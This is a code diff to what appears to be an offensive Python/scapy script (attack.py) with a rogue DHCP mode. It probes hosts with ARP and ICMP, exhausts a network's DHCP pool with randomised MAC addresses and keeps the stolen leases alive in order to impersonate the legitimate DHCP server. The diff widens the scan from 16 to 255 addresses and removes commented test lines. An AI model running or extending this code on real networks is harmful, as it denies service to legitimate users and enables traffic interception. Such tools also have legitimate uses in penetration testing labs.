@@ -106,7 +106,6 @@ def fct_dhcp_ack(dst_mac, dst_ip, src_mac, src_ip, gateway_ip, trans_id):
 
 def fct_ARP_host_check(dst_ip, src_mac, src_ip, arp_reply):
 
-    #pkt_arp = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(psrc="192.168.1.7", hwsrc="44:ff:28:d9:47:b3", pdst="192.168.1.14")
     pkt_arp = scapy.Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(psrc=src_ip, pdst=dst_ip)
     rep_arp = scapy.srp1(pkt_arp, verbose=False, timeout=0.5)
     try:
@@ -116,7 +115,6 @@ def fct_ARP_host_check(dst_ip, src_mac, src_ip, arp_reply):
     
 def fct_ICMP_host_check(dst_mac, dst_ip, src_mac, src_ip, icmp_reply):
 
-    #pkt_icmp = scapy.Ether(dst='f2:53:f9:3e:32:a6',src='44:ff:28:d9:47:b3') / scapy.IP(dst='192.168.1.2',src='192.168.1.7') / scapy.ICMP()
     pkt_icmp = scapy.Ether(dst=dst_mac,src=src_mac) / scapy.IP(dst=dst_ip,src=src_ip) / scapy.ICMP()
     rep_icmp = scapy.srp1(pkt_icmp, verbose=False, timeout=1)
     try:
@@ -182,10 +180,8 @@ if args.roguedhcp:
         avalaible_ip = []
         random_IP_list = ""
 
-        while cpt != 16: # modify from 255 to 30 (30 first address) for quick test
+        while cpt != 255: # modify from 255 to 30 (30 first address) for quick test
 
-            #request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=f"{ip_network}.{cpt}")
-            #arp_noresponse = scapy.srp(request, timeout=0.2, retry=0, verbose=False)[1]
             manager = Manager()
             arp_reply = manager.dict()
             arp_request = Process(target=fct_ARP_host_check, args=(f"{ip_network}.{cpt}", MY_mac, MY_ip, arp_reply))
@@ -222,9 +218,7 @@ if args.roguedhcp:
                 try:
                     reserved_ip = result_ack[0][scapy.IP].dst
                     lease_time = result_ack[0][scapy.DHCP].options[2][1]
-                    #print (result_ack[0][scapy.DHCP].options)
                     print (f"{Green}[+]{White} IP {reserved_ip} is reserved (ACK) ", end="\r")
-                    #lease_time = 30 # capturer le lease time dans une requete du DHCP legitimes
                     Process(target=fct_keep_starvation, args=(reserved_ip, random_mac_addr, legitime_dhcp_ip, lease_time, f"{ip_network}.{cpt}")).start()
                     random_IP_list += (f"and not ether host {random_mac_addr} ")
                     avalaible_ip.append(f"{reserved_ip}")
@@ -344,7 +338,6 @@ if args.roguedhcp:
                     print (f"{Green}[+]{White} (ICMP) Host {discover_mac} connect to {check_icmp}\n")
                     time.sleep(1)
                     next_IP += 1
-                #next_IP += 1
 
     if not args.interface:
         print ("To see help use command : \n       python3 attack.py --help")
